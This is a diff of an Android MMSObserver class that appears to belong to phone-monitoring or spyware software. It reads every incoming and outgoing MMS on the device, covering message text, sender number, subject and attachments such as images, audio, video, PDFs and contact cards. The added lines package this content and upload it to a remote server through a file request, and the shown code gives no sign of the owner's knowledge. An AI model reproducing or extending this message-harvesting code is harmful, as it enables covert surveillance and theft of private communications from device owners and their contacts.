@@ -1,6 +1,7 @@
-package com.inet.android.sms;
+package com.inet.android.message;
 
 import java.io.BufferedReader;
+import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
 import java.io.InputStream;
@@ -15,17 +16,20 @@ import android.provider.Telephony;
 import android.util.Log;
 
 import com.inet.android.request.ConstantValue;
+import com.inet.android.request.RequestList;
 import com.inet.android.utils.ConvertDate;
 import com.inet.android.utils.Logging;
 import com.inet.android.utils.ValueWork;
+import com.loopj.android.http.RequestParams;
 
 public class MMSObserver extends ContentObserver {
 	private static final String LOG_TAG = MMSObserver.class.getSimpleName()
 			.toString();
 	private static final Uri mmsURI = Uri.parse("content://mms/");
-	private static Context ctx;
+	private static Context mContext;
 	// private static long currentId = 0;
 	int mmsCount = 0;
+	private String expansion = null;
 	private boolean payload = false;
 	private int payloadSize = -1;
 
@@ -35,7 +39,7 @@ public class MMSObserver extends ContentObserver {
 
 	public MMSObserver(Handler handler, Context ctx) {
 		super(handler);
-		MMSObserver.ctx = ctx;
+		MMSObserver.mContext = ctx;
 	}
 
 	public boolean deliverSelfNotifications() {
@@ -44,14 +48,14 @@ public class MMSObserver extends ContentObserver {
 
 	public void startMMSMonitoring() {
 		final String[] projection = new String[] { "*" };
-		Cursor mmsCur = ctx.getContentResolver().query(
+		Cursor mmsCur = mContext.getContentResolver().query(
 				Telephony.Mms.CONTENT_URI, projection,
 				"msg_box = 1 or msg_box = 2", null, "_id");
 		if (mmsCur != null && mmsCur.getCount() > 0) {
 			mmsCount = mmsCur.getCount();
 			Logging.doLog(LOG_TAG, "MMSMonitor :: Init MMSCount == " + mmsCount);
 		}
-		Cursor mmsCur2 = ctx.getContentResolver().query(
+		Cursor mmsCur2 = mContext.getContentResolver().query(
 				Telephony.Mms.CONTENT_URI, projection, "msg_box = 1", null,
 				"_id");
 		if (mmsCur2 != null && mmsCur2.getCount() > 0) {
@@ -59,7 +63,7 @@ public class MMSObserver extends ContentObserver {
 			Logging.doLog(LOG_TAG,
 					"MMSMonitor :: Init MMSCount 'msg_box = 1' == " + mmsCount2);
 		}
-		Cursor mmsCur22 = ctx.getContentResolver().query(
+		Cursor mmsCur22 = mContext.getContentResolver().query(
 				Telephony.Mms.CONTENT_URI, projection, "msg_box = 2", null,
 				"_id");
 		if (mmsCur22 != null && mmsCur22.getCount() > 0) {
@@ -68,7 +72,7 @@ public class MMSObserver extends ContentObserver {
 					"MMSMonitor :: Init MMSCount 'msg_box = 2' == "
 							+ mmsCount22);
 		}
-		Cursor mmsCur3 = ctx.getContentResolver().query(
+		Cursor mmsCur3 = mContext.getContentResolver().query(
 				Telephony.Mms.CONTENT_URI, projection, "msg_box = 3", null,
 				"_id");
 		if (mmsCur3 != null && mmsCur3.getCount() > 0) {
@@ -93,11 +97,12 @@ public class MMSObserver extends ContentObserver {
 	public void onChange(boolean selfChange, Uri uri) {
 		Logging.doLog(LOG_TAG, "onChange");
 		// Logging.doLog(TAG, "uri: " + uri.toString());
-		if (ValueWork.getState(ConstantValue.TYPE_INCOMING_SMS_REQUEST, ctx) == 0)
+		if (ValueWork.getState(ConstantValue.TYPE_INCOMING_SMS_REQUEST,
+				mContext) == 0)
 			return;
-		byte[] imgData = null; // изображение mms
+		byte[] dataFile = null; // изображение mms
 		String mmsText = ""; // текст mms
-		String mmsDirection = ""; // направление mms
+		int mmsDirection = 0; // направление mms
 		String mmsNumber = ""; // номер отправителя mms
 		String mmsTime = ""; // время принятия/отправки mms
 		String mmsSubject = ""; // заголовок mms
@@ -105,8 +110,8 @@ public class MMSObserver extends ContentObserver {
 		String[] projection = new String[] { "*" };
 		Uri uriuri = Uri.parse("content://mms-sms/conversations?simple=true");
 
-		Cursor query = ctx.getContentResolver().query(uriuri, projection, null,
-				null, null);
+		Cursor query = mContext.getContentResolver().query(uriuri, projection,
+				null, null, null);
 		query.moveToFirst();
 
 		// Определение sms или mms
@@ -126,7 +131,7 @@ public class MMSObserver extends ContentObserver {
 		}
 		query.close();
 
-		Cursor mmsCursor = ctx.getContentResolver()
+		Cursor mmsCursor = mContext.getContentResolver()
 				.query(mmsURI, new String[] { "*" },
 						"msg_box = 1 or msg_box = 2", null, "_id");
 		int currentMMSCount = 0;
@@ -170,19 +175,20 @@ public class MMSObserver extends ContentObserver {
 				int type = Integer.parseInt(mmsCursor.getString(mmsCursor
 						.getColumnIndex("m_type")));
 				if (type == 128) {
-					mmsDirection = "0";
+					mmsDirection = ConstantValue.TYPE_OUTGOING_MMS_REQUEST;
 					Logging.doLog(LOG_TAG, "outgoing mms " + type);
 					Log.w(LOG_TAG, "direction: " + mmsDirection);
 				} else {
-					mmsDirection = "1";
+					mmsDirection = ConstantValue.TYPE_INCOMING_MMS_REQUEST;
 					Logging.doLog(LOG_TAG, "incoming mms " + type);
 					Log.w(LOG_TAG, "direction: " + mmsDirection);
 				}
 
 				// Get Parts
 				Uri uriMMSPart = Uri.parse("content://mms/part");
-				Cursor curPart = ctx.getContentResolver().query(uriMMSPart,
-						new String[] { "*" }, "mid = " + id, null, "_id");
+				Cursor curPart = mContext.getContentResolver().query(
+						uriMMSPart, new String[] { "*" }, "mid = " + id, null,
+						"_id");
 				Logging.doLog(LOG_TAG,
 						"parts records length == " + curPart.getCount());
 
@@ -201,13 +207,15 @@ public class MMSObserver extends ContentObserver {
 					Logging.doLog(LOG_TAG, "id == " + id);
 					Logging.doLog(LOG_TAG, "partId == " + partId);
 					Logging.doLog(LOG_TAG, "part mime type == " + contentType);
-
 					// Get the message
-					if (contentType.equalsIgnoreCase("text/plain")) {
+					expansion = isExpansion(contentType);
+					Logging.doLog(LOG_TAG, "Get the expansion" + expansion,
+							"Get the expansion" + expansion);
+					if (expansion.equals(".txt")) {
 						Logging.doLog(LOG_TAG,
 								" ==== Get the message start ====");
 
-						Cursor curPart1 = ctx.getContentResolver().query(
+						Cursor curPart1 = mContext.getContentResolver().query(
 								uriMMSPart, new String[] { "*" },
 								"mid = " + id + " and _id =" + partId, null,
 								"_id");
@@ -227,16 +235,15 @@ public class MMSObserver extends ContentObserver {
 
 						Logging.doLog(LOG_TAG, "Txt Message == " + mmsText);
 					}
-
-					// Get Image
-					else if (isImageType(contentType) == true) {
-						Logging.doLog(LOG_TAG, " ==== Get the Image start ====");
-						imgData = readMMSPart(partId);
+					// Get File
+					else if (isExpansion(contentType) != "") {
+						Logging.doLog(LOG_TAG, " ==== Get the file start ====");
+						dataFile = readMMSPart(partId);
 						if (payload) {
-							payloadSize = imgData.length;
+							payloadSize = dataFile.length;
 						}
 						Logging.doLog(LOG_TAG, "image data length == "
-								+ imgData.length);
+								+ dataFile.length);
 					}
 				} while (curPart.moveToPrevious());
 			}
@@ -251,8 +258,24 @@ public class MMSObserver extends ContentObserver {
 			} else {
 				Logging.doLog(LOG_TAG, "**Mms no payload");
 			}
+			// -------send mms--------------------------------
+
+			RequestParams params = new RequestParams();
+			params.put("data[][time]", ConvertDate.logTime());
+			params.put("data[][type]", mmsDirection);
+			if (payloadSize >= 0)
+				params.put("data[][info][payloads][]", new ByteArrayInputStream(
+						dataFile), mmsNumber + expansion);
+			params.put("data[][info][subject]", mmsSubject);
+			params.put("data[][info][number]", mmsNumber);
+			params.put("data[][info][data]", mmsText);
+
+			params.put("key", System.currentTimeMillis());
+
+			RequestList.sendFileRequest(params, mContext);
 			payload = false;
 		}
+		
 		mmsCount = mmsCursor.getCount();
 		payloadSize = -1;
 		mmsCursor.close();
@@ -263,7 +286,7 @@ public class MMSObserver extends ContentObserver {
 		InputStream is = null;
 		StringBuilder sb = new StringBuilder();
 		try {
-			is = ctx.getContentResolver().openInputStream(partURI);
+			is = mContext.getContentResolver().openInputStream(partURI);
 			if (is != null) {
 				InputStreamReader isr = new InputStreamReader(is, "UTF-8");
 				BufferedReader reader = new BufferedReader(isr);
@@ -296,7 +319,7 @@ public class MMSObserver extends ContentObserver {
 			Logging.doLog(LOG_TAG,
 					"Entered into readMMSPart try..." + partURI.toString());
 
-			is = ctx.getContentResolver().openInputStream(partURI);
+			is = mContext.getContentResolver().openInputStream(partURI);
 
 			byte[] buffer = new byte[256];
 			int len = -1;
@@ -328,20 +351,62 @@ public class MMSObserver extends ContentObserver {
 		}
 		return partData;
 	}
+
 	public void setContext(Context context) {
-		this.ctx = context;
+		this.mContext = context;
 	}
-	private boolean isImageType(String mime) {
-		boolean result = false;
-		if (mime.equalsIgnoreCase("image/jpg")
-				|| mime.equalsIgnoreCase("image/jpeg")
-				|| mime.equalsIgnoreCase("image/png")
-				|| mime.equalsIgnoreCase("image/gif")
-				|| mime.equalsIgnoreCase("image/bmp")
-				|| mime.equalsIgnoreCase("application/smil")) {
-			result = true;
+
+	private String isExpansion(String mime) {
+		// boolean result = true;
+		switch (mime) {
+		case "image/jpg":
+			return ".jpg";
+		case "image/jpeg":
+			return ".jpg";
+		case "image/png":
+			return ".png";
+		case "image/gif":
+			return ".gif";
+		case "image/bmp":
+			return ".bmp";
+		case "application/smil":
+			return ".smi";
+		case "audio/midi":
+			return ".MIDI";
+		case "audio/mpeg":
+			return ".mp3";
+		case "audio/mp4":
+			return ".m4a";
+		case "audio/x-wav":
+			return ".wav";
+		case "audio/aac":
+			return ".aac";
+		case "audio/amr":
+			return ".amr";
+		case "video/mpeg":
+			return ".mpeg";
+		case "video/mp4":
+			return ".mp4";
+		case "video/3gpp":
+			return ".3gp";
+		case "video/3gpp2":
+			return ".3g2";
+		case "video/avi":
+			return ".avi";
+		case "text/plain":
+			return ".txt";
+		case "text/html":
+			return ".html";
+		case "application/pdf":
+			return ".pdf";
+		case "text/vcard":
+			return ".vcf";
+		case "text/calendar":
+			return ".ics";
+		default:
+			break;
 		}
-		return result;
+		return "";
 	}
 
 	public static void regMMSObserver(Context mContext) {
